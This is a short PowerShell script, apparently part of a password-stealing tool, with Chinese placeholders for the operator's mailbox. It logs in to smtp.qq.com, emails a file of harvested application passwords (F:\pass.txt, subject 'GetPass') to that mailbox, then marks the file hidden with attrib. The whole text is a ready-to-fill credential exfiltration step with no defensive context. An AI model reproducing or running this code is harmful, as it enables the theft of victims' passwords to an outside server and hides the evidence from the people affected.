$SMTPServer = 'smtp.qq.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('你的邮箱', '');
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = '你的邮箱'
$ReportEmail.To.Add('你的邮箱')
$ReportEmail.Subject = 'GetPass'
$ReportEmail.Body = 'Passwords In Applications'
$ReportEmail.Attachments.Add('F:\pass.txt')
$SMTPInfo.Send($ReportEmail)
attrib +h pass.txt